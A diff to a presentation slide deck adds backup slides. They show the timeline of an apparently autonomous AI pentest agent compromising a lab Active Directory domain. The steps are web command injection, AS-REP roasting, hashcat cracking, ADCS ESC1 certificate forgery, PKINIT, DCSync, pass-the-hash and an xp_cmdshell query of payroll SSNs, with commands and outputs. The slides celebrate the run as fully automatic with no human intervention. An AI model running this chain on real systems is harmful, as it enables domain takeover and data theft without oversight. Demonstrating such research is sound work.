@@ -3650,6 +3650,205 @@ T1190 (RCE) → T1558.004 (AS-REP) → T1110.002 (offline crack) → T1649 (ADCS
 </div>
 
 ---
+transition: fade
+zoom: 0.88
+---
+
+<!-- BACKUP A · OODA Timeline STAGE 0 (WEB01) — 22 輪自動執行細節 -->
+
+<div class="slide-eyebrow">BACKUP / OODA TIMELINE · STAGE 0</div>
+<div class="slide-h1">WEB01 自動執行時間軸 <span style="color: var(--fg-dim); font-size: 1rem; font-weight: 400; margin-left: 1rem;">Loop #1–#14 · Δ +7m27s</span></div>
+<div class="slide-sub">每個 Loop = 一輪完整 Observe → Orient → Decide → Act（interval=30s · 缺 Observe = 沿用上輪 facts）</div>
+
+```text
+[20:54:06] ● MISSION   FANCY-LEMUR-433FC2 啟動
+                       mode=AUTO_FULL · interval=30s · risk=medium
+                       noise_budget=100 · targets: WEB01→DC-01→ACCT-DB01
+
+[20:54:06] ▌ Loop #1 · web 偵察
+  OBSERVE  nmap-scanner @ 192.168.0.20
+           → port 80(IIS 8.5) / 5985(WinRM) / 445(SMB) · OS=Win2012R2
+  ORIENT   T1190 confidence=0.62  (備選 T1046=0.55 · T1110.003=0.30)
+           "port 80 IIS 開放，先做 web 偵察"
+  DECIDE   composite=0.62 → auto_approved · noise 100→95
+  ACT      web-scanner:web_scan @ http://192.168.0.20
+           → /debug.aspx (cmd 參數) · /default.aspx · /login.aspx
+
+[20:54:36] ▌ Loop #2 · debug.aspx 命令注入
+  OBSERVE  +1 關鍵 fact: service.web_path="/debug.aspx (cmd parameter)"
+  ORIENT   T1190 confidence=0.75 ↑ ("ASP.NET debug 頁面在生產環境異常存在")
+  DECIDE   0.75 → auto · noise 95→88（RCE 嘗試扣 7 點）
+  ACT      web-scanner:web_rce_execute
+           GET /debug.aspx?cmd=whoami → "iis apppool\defaultapppool"
+           +2 facts: access.web_shell · access.initial
+
+[20:55:06] ▌ Loop #3-#14 · 橫向偵察序列（每 30s 一輪）
+  #3  whoami /groups              IIS 帳號域身份
+  #4  net user /domain            枚舉域帳號
+  #5  nltest /domain_trusts       確認域信任
+  #6  ipconfig /all               確認 192.168.0.x 內網路由
+  #7  net group "Domain Admins"   DA 帳號清單
+  #8  wmic computersystem domain  → corp.athena.lab
+  #9  nltest /dclist              找到 DC-01
+  #10 nslookup DC-01              → 192.168.0.16
+  #11 nslookup ACCT-DB01          → 192.168.0.23
+  #12 nmap DC-01 (via web shell)  port 88/389/445 OPEN
+  #13 whoami /priv                SeImpersonatePrivilege
+  #14 facts 足夠 → WEB01 compromised
+
+[21:01:33] ★ WEB01 COMPROMISED · Δ +7m27s
+            facts: 12 (service×5 · access×2 · ad×5)
+            noise_budget: 88 → 52
+```
+
+---
+transition: fade
+zoom: 0.86
+---
+
+<!-- BACKUP B · OODA Timeline STAGE 1 part 1 — bloodhound + AS-REP + hashcat -->
+
+<div class="slide-eyebrow">BACKUP / OODA TIMELINE · STAGE 1 (1/2)</div>
+<div class="slide-h1">DC-01 — bloodhound · AS-REP · hashcat <span style="color: var(--fg-dim); font-size: 1rem; font-weight: 400; margin-left: 1rem;">Loop #15–#17</span></div>
+
+```text
+[21:01:33] ▌ Loop #15 · bloodhound 全景偵察
+  OBSERVE  active_target = DC-01 · 沿用 ad.dc_hostname / dc_ip facts
+  ORIENT   T1087.002 confidence=0.82
+           "DC-01 88(KDC)/389(LDAP) 確認 → bloodhound 一次收齊
+            ACL/委派/PreAuth 設定，最有效率"
+  DECIDE   0.82 → auto_approved
+  ACT      bloodhound-collector:collect @ DC-01
+           +3 critical facts:
+             ad.user_no_preauth = "legacy_kev@corp.athena.lab"
+             ad.adcs_template   = "VulnTemplate1 (ESC1)"
+             ad.delegation      = "WEB01$ TrustedForDelegation=True"
+
+[21:02:03] ▌ Loop #16 · AS-REP Roast (T1558.004)
+  OBSERVE  +1 觸發 fact: ad.user_no_preauth="legacy_kev"
+  ORIENT   T1558.004 confidence=0.87 (備選 T1110.003=0.30 · T1649=0.71)
+           "legacy_kev DoesNotRequirePreAuth=True 確認 →
+            KDC 直接回傳 NT hash 加密的 AS-REP，零憑證可執行"
+  DECIDE   0.87 > 0.5 → auto · noise 52→45
+  ACT      impacket-ad:asrep_roast @ corp.athena.lab
+           GetNPUsers -no-pass -usersfile [legacy_kev]
+           → $krb5asrep$23$legacy_kev@corp.athena.lab:3a7f8c2d... (558 chars)
+           +3 facts: credential.kerberos_hash · hash_type · username
+
+[21:02:33] ▌ Loop #17 · hashcat 離線破解 (T1110.002)
+  OBSERVE  +1 fact: credential.kerberos_hash (RC4-HMAC type 23)
+  ORIENT   T1110.002 confidence=0.91 ↑（hash 在手，執行確定性最高）
+           "type 23 無 salt → 離線破解、無帳號鎖定風險"
+  DECIDE   0.91 → auto_approved
+  ACT      hashcat-crack:crack_hash
+           hash=$krb5asrep$23$... · mode=18200 · wordlist=hashcat-custom.txt
+           → M0nk3y!B@n4n4#99（字典命中）
+           +2 facts: credential.plaintext · cracked=True
+```
+
+---
+transition: fade
+zoom: 0.86
+---
+
+<!-- BACKUP C · OODA Timeline STAGE 1 part 2 — ESC1 + PKINIT + DCSync -->
+
+<div class="slide-eyebrow">BACKUP / OODA TIMELINE · STAGE 1 (2/2)</div>
+<div class="slide-h1">DC-01 — ESC1 · PKINIT · DCSync <span style="color: var(--fg-dim); font-size: 1rem; font-weight: 400; margin-left: 1rem;">Loop #18–#20</span></div>
+
+```text
+[21:03:03] ▌ Loop #18 · ADCS ESC1 偽造憑證 (T1649)
+  OBSERVE  facts: credential.plaintext + ad.adcs_template (VulnTemplate1)
+  ORIENT   T1649 confidence=0.85 (備選 T1558.001 Kerberoast=0.60，無 SPN)
+           "ESC1 允許 ENROLLEE_SUPPLIES_SUBJECT —
+            任何 Domain User 可申請含任意 UPN 的憑證 →
+            以 legacy_kev 申請 da_alice UPN，比直接攻 DA 帳號更安全"
+  DECIDE   0.85 → auto_approved
+  ACT      certipy-ad:certipy_request
+           user=legacy_kev@corp · pass=M0nk3y!B@n4n4#99
+           ca=corp-CA · template=VulnTemplate1 · upn=da_alice@corp
+           CA 驗證: legacy_kev Enroll ✓ · VulnTemplate1 SAN ✓
+                   ✗ 未驗證申請者與 UPN 是否一致（根本漏洞）
+           → da_alice.pfx (CA 正式簽發)
+           +2 facts: credential.certificate · pfx_subject
+
+[21:03:33] ▌ Loop #19 · PKINIT → NTLM (T1550.003 · UnPAC-the-Hash)
+  OBSERVE  +1 fact: credential.certificate="da_alice.pfx"
+  ORIENT   T1550.003 confidence=0.92
+           "da_alice.pfx = CA 正式簽發的 DA 憑證 → PKINIT 換 TGT
+            KDC 回傳的 PAC 含 NTLM hash → Pass-the-Hash 無需明文"
+  DECIDE   0.92 → auto_approved
+  ACT      certipy-ad:certipy_auth · pfx=da_alice.pfx
+           PKINIT 握手 → KDC → TGT + NT hash (AS-REP enc-part)
+           → da_alice NT hash = 795fcdc2f51587174873e203d281177b
+           +3 facts: credential.ntlm_hash · da_access · privilege=Domain_Admin
+
+[21:04:03] ▌ Loop #20 · DCSync (T1003.003)
+  OBSERVE  facts: credential.ntlm_hash + ad.privilege_level=Domain_Admin
+  ORIENT   T1003.003 confidence=0.95 ↑ (facts 齊全，執行確定性最高)
+           "da_alice DA → DS-Replication-Get-Changes 權限
+            DCSync 模擬 DC 複製 → 取得 NTDS.dit 全帳號 hash
+            （含 krbtgt → Golden Ticket 可用）"
+  DECIDE   0.95 → auto_approved
+  ACT      impacket-ad:secretsdump · hash=:795fcdc2...
+           → Administrator:500:...:8f4dba9d...
+             krbtgt:502:...:c1d8e8b3...
+             da_alice:1106:...:795fcdc2...
+           +4 facts: ntds_dump · admin_hash · krbtgt_hash · dc_compromised
+
+[21:11:37] ★ DC-01 COMPROMISED · Δ +10m04s
+            facts: 28 累積 · noise_budget: 45 → 28
+```
+
+---
+transition: fade
+zoom: 0.88
+---
+
+<!-- BACKUP D · OODA Timeline STAGE 2 + Mission Complete summary -->
+
+<div class="slide-eyebrow">BACKUP / OODA TIMELINE · STAGE 2 + COMPLETE</div>
+<div class="slide-h1">ACCT-DB01 — WMIExec · xp_cmdshell <span style="color: var(--fg-dim); font-size: 1rem; font-weight: 400; margin-left: 1rem;">Loop #21–#22 · Δ +1m26s</span></div>
+
+```text
+[21:11:37] ▌ Loop #21 · WMIExec Pass-the-Hash (T1021.002)
+  OBSERVE  active_target = ACCT-DB01 · 沿用 facts:
+             credential.ntlm_hash="da_alice:795fcdc..." (DA 等級)
+             service.open_port="1433/MSSQL" (Loop #12 偵察所得)
+  ORIENT   T1021.002 confidence=0.93
+           "da_alice DA hash → 對所有域機器有本機管理員權限 →
+            WMIExec PtH 直接取得 SYSTEM shell，無需新漏洞"
+  DECIDE   0.93 → auto_approved
+  ACT      impacket-ad:wmiexec
+           target=192.168.0.23 · user=da_alice · hash=:795fcdc2...
+           → C:\Windows\system32> whoami → nt authority\system
+           +2 facts: access.system_shell · db_server
+
+[21:12:07] ▌ Loop #22 · xp_cmdshell 資料外洩 (T1059.001)
+  OBSERVE  +1 fact: access.system_shell="SYSTEM@ACCT-DB01"
+  ORIENT   T1059.001 confidence=0.88
+           "SYSTEM shell 就位 + port 1433 確認 → xp_cmdshell SQL 觸發
+            最終目標：Accounting.Payroll 財務資料"
+  DECIDE   0.88 → auto_approved
+  ACT      attack-executor:mssql_xp_cmdshell
+           SELECT TOP 5 SSN, Name FROM Accounting.Payroll
+           → 123-45-6789 | John Smith
+             234-56-7890 | Jane Doe ...
+           +2 facts: access.data_exfil · ad.db_compromised
+
+[21:13:03] ★ ACCT-DB01 COMPROMISED · Δ +1m26s · noise 28→18
+```
+
+<div style="background: var(--bg-elev); border: 1px solid var(--accent-green); border-left: 3px solid var(--accent-green); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 0.7rem; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; line-height: 1.7;">
+<div style="color: var(--accent-green); font-size: 0.65rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">// MISSION COMPLETE · 21:13:03</div>
+<div style="color: var(--fg);">
+20:54:06 啟動 → 21:13:03 完成<br/>
+<strong style="color: var(--accent-amber);">總耗時 18m57s · 22 輪 OODA · 全自動 · 零人工介入</strong><br/>
+noise_budget: 100 → 18（消耗 82 點）· facts: 32 條（service 8 + credential 10 + access 7 + ad 7）
+</div>
+</div>
+
+---
 layout: cover
 class: 'text-center'
 ---
@@ -4255,6 +4454,16 @@ class: 'text-center'
 ---
 
 <!-- Slide 61 from Harry's PPT — Thanks -->
+
+<div style="position: absolute; bottom: 2rem; left: 2.6rem; display: flex; flex-direction: column; align-items: center; z-index: 10;">
+<img src="/qr-feedback.png" style="width: 8rem; height: 8rem; border-radius: 8px;" alt="Feedback QR" />
+<div style="margin-top: 0.5rem; font-family: var(--font-mono, 'JetBrains Mono', monospace); font-size: 0.7rem; color: var(--fg-dim, #808a80); letter-spacing: 0.14em; text-transform: uppercase;">Feedback</div>
+</div>
+
+<div style="position: absolute; bottom: 2rem; right: 2.6rem; display: flex; flex-direction: column; align-items: center; z-index: 10;">
+<img src="/qr-github.png" style="width: 8rem; height: 8rem; border-radius: 8px;" alt="GitHub Repo" />
+<div style="margin-top: 0.5rem; font-family: var(--font-mono, 'JetBrains Mono', monospace); font-size: 0.7rem; color: var(--fg-dim, #808a80); letter-spacing: 0.14em; text-transform: uppercase;">GitHub</div>
+</div>
 
 <div style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 4rem;">
 
